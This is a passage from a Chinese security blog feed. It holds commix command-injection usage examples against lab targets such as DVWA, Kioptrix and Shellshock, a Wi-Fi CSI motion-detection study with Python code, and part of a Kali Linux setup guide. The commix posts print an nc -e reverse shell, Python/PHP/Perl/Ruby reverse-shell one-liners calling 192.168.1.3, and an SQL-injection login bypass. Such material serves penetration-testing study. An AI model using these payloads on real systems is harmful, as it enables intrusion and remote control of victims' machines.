注入有效负载前缀字符串。</div><div class="line">    --technique = TECH　　　指定要使用的进样技术。</div><div class="line">    --maxlen = MAXLEN　　　 设置与时间相关的最大输出长度,注射技术（默认：10000字符）。</div><div class="line">    --delay = DELAY　　　　 设置与时间相关的注入的自定义时间延迟术（默认：1秒）。</div><div class="line">    --tmp-path = TMP_P ..  设置Web服务器的临时目录的绝对路径。</div><div class="line">    --root-dir = SRV_R ..  设置Web服务器根目录的绝对路径。</div><div class="line">    --alter-shell = AL ..  使用另一个os-shell（例如&apos;Python&apos;）。</div><div class="line">    --os-cmd = OS_CMD　　　 执行单个操作系统命令。</div><div class="line">    --os = OS　　　　　　　　将后端操作系统强制为此值。</div><div class="line">    --tamper = TAMPER　　　使用给定脚本篡改注射数据。</div><div class="line"></div><div class="line">  检测：</div><div class="line">    这些选项可用于自定义检测阶段。</div><div class="line"></div><div class="line">    --level = LEVEL　　要执行的测试级别（1-3，默认值：1）。</div><div class="line">    --skip-calc　　　　在检测期间跳过数学计算</div><div class="line">    --dependencies　　检查第三方（非内核）依赖关系。</div><div class="line">    --skip-waf　　　　绕过启发式检测WAF / IPS / IDS保护。</div></pre></td></tr></table></figure><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">python commix.py –url=&quot;http://192.168.1.4/test/test.php?addr=INJECT_HERE” --os-cmd=&quot;nc -e /bin/sh 192.168.1.3 1234″</div><div class="line"></div><div class="line"></div><div class="line">Freebuf给出的一些用法（http://www.freebuf.com/sectool/64030.html）</div><div class="line"></div><div class="line">测试漏洞web应用Damn</div><div class="line"></div><div class="line">python commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=INJECT_HERE&amp;submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot;</div><div class="line">使用注入攻击Payload参数测试php-Charts 1.0</div><div class="line"></div><div class="line">python commix.py --url=&quot;http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=INJECT_HERE&quot; --prefix=&quot;//&quot; --suffix=&quot;&apos;&quot;</div><div class="line">使用特殊的头和HTTP代理测试OWASP Mutillidae</div><div class="line"></div><div class="line">python commix.py --url=&quot;http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php&quot; --data=&quot;target_host=INJECT_HERE&quot; --headers=&quot;Accept-Language:fr\nETag:123\n&quot; --proxy=&quot;127.0.0.1:8081&quot;</div><div class="line">使用ICMP渗漏（exfiltration）技术测试Persistence</div><div class="line"></div><div class="line">su -c &quot;python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --icmp-exfil=&quot;ip_src=192.168.178.5,ip_dst=192.168.178.8&quot;&quot;</div><div class="line"> </div><div class="line"></div><div class="line">配合一些反弹shell</div><div class="line"></div><div class="line">1. Python-reverse-shell:</div><div class="line">　　python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\”192.168.1.3\”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\”/bin/sh\”,\”-i\”]);’</div><div class="line">2. PHP-reverse-shell:</div><div class="line">　　php -r ‘\$sock=fsockopen(\”192.168.1.3\”,1234);exec(\”/bin/sh -i &lt;%263 &gt;%263 2&gt;%263\”);’</div><div class="line">3. Perl-reverse-shell:</div><div class="line">　　perl -e ‘use Socket;\$i=\”192.168.1.3\”;\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\”tcp\”));if(connect(S,sockaddr_in(\$p,inet_aton(\$i))))&#123;open(STDIN,\”&gt;%26S\”);open(STDOUT,\”&gt;%26S\”);open(STDERR,\”&gt;%26S\”);exec(\”/bin/sh -i\”);&#125;;’</div><div class="line">4. Ruby-reverse-shell:</div><div class="line">　　ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(\”192.168.1.3\”,1234);while(cmd=c.gets);IO.popen(cmd,\”r\”)&#123;|io|c.print io.read&#125;end’</div></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>commix使用示例</title>
      <link href="/2017/01/21/commix%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/"/>
      <url>/2017/01/21/commix%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/</url>
      <content type="html"><![CDATA[<h4 id="1-Exploiting-Damn-Vulnerable-Web-App"><a href="#1-Exploiting-Damn-Vulnerable-Web-App" class="headerlink" title="1. Exploiting Damn Vulnerable Web App:"></a>1. Exploiting <a href="http://www.dvwa.co.uk/" target="_blank" rel="external">Damn Vulnerable Web App</a>:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=127.0.0.1&amp;submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot;</div></pre></td></tr></table></figure><h4 id="2-Exploiting-php-Charts-1-0-using-injection-payload-suffix-amp-prefix-string"><a href="#2-Exploiting-php-Charts-1-0-using-injection-payload-suffix-amp-prefix-string" class="headerlink" title="2. Exploiting php-Charts 1.0 using injection payload suffix &amp; prefix string:"></a>2. Exploiting <a href="http://www.exploit-db.com/exploits/25496/" target="_blank" rel="external">php-Charts 1.0</a> using injection payload suffix &amp; prefix string:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=test&quot; --prefix=&quot;&apos;&quot; --suffix=&quot;//&quot;</div></pre></td></tr></table></figure><h4 id="3-Exploiting-OWASP-Mutillidae-using-extra-headers-and-HTTP-proxy"><a href="#3-Exploiting-OWASP-Mutillidae-using-extra-headers-and-HTTP-proxy" class="headerlink" title="3. Exploiting OWASP Mutillidae using extra headers and HTTP proxy:"></a>3. Exploiting <a href="https://www.owasp.org/index.php/Category:OWASP_Mutillidae" target="_blank" rel="external">OWASP Mutillidae</a> using extra headers and HTTP proxy:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php&quot; --data=&quot;target_host=127.0.0.1&quot; --headers=&quot;Accept-Language:fr\nETag:123\n&quot; --proxy=&quot;127.0.0.1:8081&quot;</div></pre></td></tr></table></figure><h4 id="4-Exploiting-Persistence-using-ICMP-exfiltration-technique"><a href="#4-Exploiting-Persistence-using-ICMP-exfiltration-technique" class="headerlink" title="4. Exploiting Persistence using ICMP exfiltration technique:"></a>4. Exploiting <a href="https://www.vulnhub.com/entry/persistence-1,103/" target="_blank" rel="external">Persistence</a> using ICMP exfiltration technique:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --icmp-exfil=&quot;ip_src=192.168.178.5,ip_dst=192.168.178.8&quot;</div></pre></td></tr></table></figure><h4 id="5-Exploiting-Persistence-using-an-alternative-python-shell"><a href="#5-Exploiting-Persistence-using-an-alternative-python-shell" class="headerlink" title="5. Exploiting Persistence using an alternative (python) shell:"></a>5. Exploiting <a href="https://www.vulnhub.com/entry/persistence-1,103/" target="_blank" rel="external">Persistence</a> using an alternative (python) shell:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --alter-shell=&quot;Python&quot;</div></pre></td></tr></table></figure><h4 id="6-Exploiting-Kioptrix-Level-1-1-2"><a href="#6-Exploiting-Kioptrix-Level-1-1-2" class="headerlink" title="6. Exploiting Kioptrix: Level 1.1 (#2):"></a>6. Exploiting <a href="http://www.kioptrix.com/dlvm/Kioptrix_Level_2.rar" target="_blank" rel="external">Kioptrix: Level 1.1 (#2)</a>:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.2/pingit.php&quot; --data=&quot;ip=127.0.0.1E&amp;submit=submit&quot; --auth-url=&quot;http://192.168.178.2/index.php&quot; --auth-data=&quot;uname=admin&amp;psw=%27+OR+1%3D1--+-&amp;btnLogin=Login&quot;</div></pre></td></tr></table></figure><h4 id="7-Exploiting-Kioptrix-2014-5-using-custom-user-agent-and-specified-injection-technique"><a href="#7-Exploiting-Kioptrix-2014-5-using-custom-user-agent-and-specified-injection-technique" class="headerlink" title="7. Exploiting Kioptrix: 2014 (#5) using custom user-agent and specified injection technique:"></a>7. Exploiting <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/" target="_blank" rel="external">Kioptrix: 2014 (#5)</a> using custom user-agent and specified injection technique:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.6:8080/phptax/drawimage.php?pfilez=127.0.0.1&amp;pdf=make&quot; --user-agent=&quot;Mozilla/4.0 Mozilla4_browser&quot; --technique=&quot;f&quot; --root-dir=&quot;/&quot;</div></pre></td></tr></table></figure><h4 id="8-Exploiting-CVE-2014-6271-Shellshock"><a href="#8-Exploiting-CVE-2014-6271-Shellshock" class="headerlink" title="8. Exploiting CVE-2014-6271/Shellshock:"></a>8. Exploiting <a href="https://pentesterlab.com/exercises/cve-2014-6271" target="_blank" rel="external">CVE-2014-6271/Shellshock</a>:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.4/cgi-bin/status/&quot; --shellshock</div></pre></td></tr></table></figure><h4 id="9-Exploiting-commix-testbed-cookie-using-cookie-based-injection"><a href="#9-Exploiting-commix-testbed-cookie-using-cookie-based-injection" class="headerlink" title="9. Exploiting commix-testbed (cookie) using cookie-based injection:"></a>9. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/cookie" target="_blank" rel="external">commix-testbed (cookie)</a> using cookie-based injection:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.8/commix-testbed/scenarios/cookie/cookie(blind).php&quot; --cookie=&quot;addr=127.0.0.1&quot;</div></pre></td></tr></table></figure><h4 id="10-Exploiting-commix-testbed-user-agent-using-ua-based-injection"><a href="#10-Exploiting-commix-testbed-user-agent-using-ua-based-injection" class="headerlink" title="10. Exploiting commix-testbed (user-agent) using ua-based injection:"></a>10. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/user-agent" target="_blank" rel="external">commix-testbed (user-agent)</a> using ua-based injection:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.4/commix-testbed/scenarios/user-agent/ua(blind).php&quot; --level=3</div></pre></td></tr></table></figure><h4 id="11-Exploiting-commix-testbed-referer-using-referer-based-injection"><a href="#11-Exploiting-commix-testbed-referer-using-referer-based-injection" class="headerlink" title="11. Exploiting commix-testbed (referer) using referer-based injection:"></a>11. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/referer" target="_blank" rel="external">commix-testbed (referer)</a> using referer-based injection:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.4/commix-testbed/scenarios/referer/referer(classic).php&quot; --level=3</div></pre></td></tr></table></figure><h4 id="12-Exploiting-Flick-2-using-custom-headers-and-base64-encoding-option"><a href="#12-Exploiting-Flick-2-using-custom-headers-and-base64-encoding-option" class="headerlink" title="12. Exploiting Flick 2 using custom headers and base64 encoding option:"></a>12. Exploiting <a href="https://www.vulnhub.com/entry/flick-2,122/" target="_blank" rel="external">Flick 2</a> using custom headers and base64 encoding option:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;https://192.168.2.12/do/cmd/*&quot; --headers=&quot;X-UUID:commix\nX-Token:dTGzPdMJlOoR3CqZJy7oX9JU72pvwNEF&quot; --base64</div></pre></td></tr></table></figure><h4 id="13-Exploiting-commix-testbed-JSON-based-using-JSON-POST-data"><a href="#13-Exploiting-commix-testbed-JSON-based-using-JSON-POST-data" class="headerlink" title="13. Exploiting commix-testbed (JSON-based) using JSON POST data:"></a>13. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/scenarios/regular/POST" target="_blank" rel="external">commix-testbed (JSON-based)</a> using JSON POST data:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.11/commix-testbed/scenarios/regular/POST/classic_json.php&quot; --data=&apos;&#123;&quot;addr&quot;:&quot;127.0.0.1&quot;,&quot;name&quot;:&quot;ancst&quot;&#125;&apos;</div></pre></td></tr></table></figure><h4 id="14-Exploiting-SickOs-1-1-using-shellshock-module-and-HTTP-proxy"><a href="#14-Exploiting-SickOs-1-1-using-shellshock-module-and-HTTP-proxy" class="headerlink" title="14. Exploiting SickOs 1.1 using shellshock module and HTTP proxy:"></a>14. Exploiting <a href="https://www.vulnhub.com/entry/sickos-11,132/" target="_blank" rel="external">SickOs 1.1</a> using shellshock module and HTTP proxy:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.8/cgi-bin/status&quot; --shellshock --proxy=&quot;192.168.2.8:3128&quot;`</div></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>基于CSI的移动目标侦测研究学习</title>
      <link href="/2017/01/21/%E5%9F%BA%E4%BA%8ECSI%E7%9A%84%E7%A7%BB%E5%8A%A8%E7%9B%AE%E6%A0%87%E4%BE%A6%E6%B5%8B%E7%A0%94%E7%A9%B6%E5%AD%A6%E4%B9%A0/"/>
      <url>/2017/01/21/%E5%9F%BA%E4%BA%8ECSI%E7%9A%84%E7%A7%BB%E5%8A%A8%E7%9B%AE%E6%A0%87%E4%BE%A6%E6%B5%8B%E7%A0%94%E7%A9%B6%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h4 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h4><p>需要用到<a href="http://dhalperi.github.io/linux-80211n-csitool/" target="_blank" rel="external">CSI tool</a>，这是一个运行在Ubuntu上的利用Intel Wi-Fi Wireless Link 5300 802.11n来做分析的程序。这里可以使用作者网站中方法来安装，也可以下载<a href="http://pan.baidu.com/s/1dDhFuNJ" target="_blank" rel="external">清华的版本</a>。清华的版本附带了安装说明书，参考说明书上的方法，安装即可。</p><p>需要注意的是，发射源路由器需要选择单天线支持802.11n的路由器，我使用的是TP-LINK TL-WR742N。</p><h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><p>cd进入csitools文件夹，进入linux-80211n-csitool-supplementary/netlink，运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./log_to_file tmp.dat</div></pre></td></tr></table></figure><p>打开另一个终端，运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ping 192.168.1.1 -i 0.2</div></pre></td></tr></table></figure><p>netlink文件夹中的tmp.dat就是采集的原始数据。</p><h4 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h4><p>使用Matlab读取数据，进入linux-80211n-csitool-supplementary/matlab文件夹，使用read_bf_file函数可以读取数据。</p><p>一个例子数据包里包含</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">timestamp_low: <span class="number">4</span> (In the sample trace, timestamp_low is invalid and always <span class="number">4.</span>)</div><div class="line">bfee_count: <span class="number">72</span></div><div class="line">Nrx: <span class="number">3</span></div><div class="line">Ntx: <span class="number">1</span></div><div class="line">rssi_a: <span class="number">33</span></div><div class="line">rssi_b: <span class="number">37</span></div><div class="line">rssi_c: <span class="number">41</span></div><div class="line">noise: <span class="number">-127</span></div><div class="line">agc: <span class="number">38</span></div><div class="line">perm: [<span class="number">3</span> <span class="number">2</span> <span class="number">1</span>]</div><div class="line">rate: <span class="number">256</span></div><div class="line">csi: [<span class="number">1</span>x3x30 double]</div></pre></td></tr></table></figure><ul><li><strong>timestamp_low</strong> 是时间戳</li><li><strong>bfee_count</strong> 数据包数量</li><li><strong>Nrx,Ntx</strong> 分别表示接收端和发送端的天线数量</li><li><strong>rssi_a, rssi_b, rssi_c</strong> 每个天线的RSSI数据，单位dB，</li><li><strong>agc</strong> Automatic Gain Control</li><li><strong>perm</strong> NIC重排列后的顺序结果，代表RF链路的顺序</li><li><strong>rate</strong> 发送包的rate</li><li><strong>csi</strong> CSI原始数据，是个Ntx×Nrx×30复数矩阵</li></ul><p>主要提取出CSI数据和timestamp_low。</p><h4 id="数据预处理"><a href="#数据预处理" class="headerlink" title="数据预处理"></a>数据预处理</h4><p>为了避免相位的偏移的影响，需要将相位进行线性变换，参考论文，写出了以下Python代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">import</span> copy</div><div class="line">N = <span class="number">1000</span> <span class="comment"># N为采集的数据包数量</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">complexDecoding</span><span class="params">(raw_data)</span>:</span></div><div class="line">“””</div><div class="line">将原始数据转化为Python可识别的复数</div><div class="line">这里使用了第一个天线的数据raw_data[<span class="number">0</span>]</div><div class="line">第二根第三根天线数据下标分别为<span class="number">1</span>, <span class="number">2</span></div><div class="line">原始数据为a + bi, python为a + bj</div><div class="line">返回处理后的数据</div><div class="line">“””</div><div class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(N):</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>): <span class="comment"># 30 代表子载波数量，固定为30</span></div><div class="line"><span class="keyword">if</span> raw_data[<span class="number">0</span>][<span class="number">-1</span>] == ‘i’:</div><div class="line">data.append(complex(raw_data[<span class="number">0</span>][:<span class="number">-1</span>]+‘j’))</div><div class="line"><span class="keyword">else</span>:</div><div class="line">data.append(complex(raw_data[<span class="number">0</span>]))</div><div class="line"><span class="keyword">return</span> data</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAP</span><span class="params">(data)</span>:</span></div><div class="line">“””</div><div class="line">根据复数计算振幅和相位</div><div class="line">“””</div><div class="line">amplitudes = [([] * <span class="number">30</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(N)]</div><div class="line">phases = [([] * <span class="number">30</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(N)]</div><div class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(N):</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</div><div class="line">r = sqrt((data[i + m * <span class="number">30</span>].real) ** <span class="number">2</span> + (data[i + m * <span class="number">30</span>].imag) ** <span class="number">2</span>)</div><div class="line">amplitudes[m].append(r)</div><div class="line">phases[m].append(np.angle(data[i + m * <span class="number">30</span>]))</div><div class="line"><span class="keyword">return</span> (amplitudes, phases)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocessingPhase</span><span class="params">(phases)</span>:</span></div><div class="line">“””</div><div class="line">将相位进行线性变换</div><div class="line">index是 <span class="number">-28</span> 到 <span class="number">28</span> 根据 IEEE <span class="number">802.11</span>n 协议</div><div class="line">返回变换后的相位</div><div class="line">“””</div><div class="line">index = range(<span class="number">-28</span>,<span class="number">0</span>,<span class="number">2</span>) + [<span class="number">-1</span>, <span class="number">1</span>] + range(<span class="number">3</span>,<span class="number">28</span>, <span class="number">2</span>) + [<span class="number">28</span>]</div><div class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(N):</div><div class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">clear = <span class="keyword">True</span></div><div class="line">base = <span class="number">0</span></div><div class="line">tphases[m][<span class="number">0</span>] = phases[m][<span class="number">0</span>]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</div><div class="line"><span class="keyword">if</span> phases[m][i] – phases[m][i<span class="number">-1</span>] &gt; pi:</div><div class="line">base += <span class="number">1</span></div><div class="line">clear = <span class="keyword">False</span></div><div class="line"><span class="keyword">elif</span> phases[m][i] – phases[m][i<span class="number">-1</span>] &lt; -pi:</div><div class="line">base –= <span class="number">1</span></div><div class="line">clear = <span class="keyword">False</span></div><div class="line">tphases[m][i] = phases[m][i] – <span class="number">2</span> * pi * base</div><div class="line"><span class="keyword">if</span> clear == <span class="keyword">True</span>:</div><div class="line"><span class="keyword">break</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</div><div class="line">phases[m][i] = tphases[m][i] – (tphases[m][<span class="number">29</span>] – tphases[m][<span class="number">0</span>])</div><div class="line">* <span class="number">1.0</span> /(<span class="number">28</span> – (<span class="number">-28</span>)) * (index[i])</div><div class="line">– <span class="number">1.0</span> / <span class="number">30</span> * sum([tphases[m][j] <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">30</span>)])</div><div class="line"><span class="keyword">return</span> phases</div></pre></td></tr></table></figure><h4 id="参考论文"><a href="#参考论文" class="headerlink" title="参考论文"></a>参考论文</h4><ol><li>PADS Passive Detection of Moving Targets with Dynamic Speed using PHY Layer Information</li></ol>]]></content>
      
      
    </entry>
    
    <entry>
      <title>kali linux 2016 使用指南(二)</title>
      <link href="/2017/01/21/kali-linux-2016-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-%E4%BA%8C/"/>
      <url>/2017/01/21/kali-linux-2016-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-%E4%BA%8C/</url>
      <content type="html"><![CDATA[<h4 id="虚拟机安装增强"><a href="#虚拟机安装增强" class="headerlink" title="虚拟机安装增强"></a>虚拟机安装增强</h4><h5 id="1-Kali-官方安装"><a href="#1-Kali-官方安装" class="headerlink" title="1.Kali 官方安装"></a>1.Kali 官方安装</h5><p>更新 /etc/apt/sources.list</p><p>你所添加的源，请确保是我在一中写的所有</p><p>然后在线安装增强功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">apt-get update</div><div class="line"></div><div class="line">apt-get install -y virtualbox-guest-x11</div><div class="line"></div><div class="line">reboot</div></pre></td></tr></table></figure><h5 id="2-VirtualBox自带包安装"><a href="#2-VirtualBox自带包安装" class="headerlink" title="2.VirtualBox自带包安装"></a>2.VirtualBox自带包安装</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">apt-get update &amp;&amp; apt-get install -y linux-headers-$(uname-r)</div><div class="line"></div><div class="line">cp /media/cd-rom/VBoxLinuxAdditions.run /root/</div><div class="line"></div><div class="line">chmod 755 /root/VBoxLinuxAdditions.run</div><div class="line"></div><div class="line">cd/root</div><div class="line"></div><div class="line">./VBoxLinuxAdditions.run</div></pre></td></tr></table></figure><h4 id="内核头有问题自己手动安装过程"><a href="#内核头有问题自己手动安装过程" class="headerlink" title="内核头有问题自己手动安装过程"></a>内核头有问题自己手动安装过程</h4><p>打开 <a href="http://http.kali.org/kali/pool/main/l/linux/%20" target="_blank" rel="external">http://http.kali.org/kali/pool/main/l/linux/</a></p><p>下载对应自己内核版本的 linux-kbuild</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">wget http://http.kali.org/kali/pool/main/l/linux/linux-kbuild-4.6_4.6.4-1kali1_amd64.deb</div><div class="line"></div><div class="line">dpkg -i linux-kbuild-4.6_4.6.4-1kali1_amd64.deb</div><div class="line"></div><div class="line">wget http://http.kali.org/kali/pool/main/l/linux/linux-headers-4.6.0-kali1-common_4.6.4-1kali1_amd64.deb</div><div class="line"></div><div class="line">wget http://http.kali.org/kali/pool/main/l/linux/http://http.kali.org/kali/pool/main/l/linux/linux-headers-4.6.0-kali1-amd64_4.6.4-1kali1_amd64.deb</div><div class="line"></div><div class="line">dpkg -i linux-headers-4.6.0-kali1-common_4.6.4-1kali1_amd64.deb</div><div class="line"></div><div class="line">dpkg -i linux-headers-4.6.0-kali1-amd64_4.6.4-1kali1_amd64.deb</div><div class="line"></div><div class="line">apt-get -f install</div></pre></td></tr></table></figure><h4 id="开启SSH服务"><a href="#开启SSH服务" class="headerlink" title="开启SSH服务"></a>开启SSH服务</h4><p>首先：编辑sshd_config文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/ssh/sshd_config</div></pre></td></tr></table></figure><p>其次：将sshd_config文件中的语句PermitRootLogin prohibit-password修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PermitRootLogin yes</div></pre></td></tr></table></figure><p>再次：使用命令启动SSH服务:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/ssh start</div><div class="line"># 或者</div><div class="line">service ssh start</div></pre></td></tr></table></figure><p>最后：设置系统开机自动启动SSH服务:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">update-rc.d ssh enable  //系统自动启动SSH服务</div></pre></td></tr></table></figure><h4 id="mysql重置密码"><a href="#mysql重置密码" class="headerlink" title="mysql重置密码"></a>mysql重置密码</h4><p>1、如果<a href="http://lib.csdn.net/base/linux" target="_blank" rel="external">Linux</a>中未安装<a href="http://lib.csdn.net/base/mysql" target="_blank" rel="external">MySQL</a>，则需要下载安装，<strong>在安装的过程中会要求输入用户名密码</strong>，则无需重置，直接设置</p><p>2、MySQL设置UTF-8编码格式**</p><p>配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~# vim /etc/mysql/my.cnf</div></pre></td></tr></table></figure><p>添加默认utf-8编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div 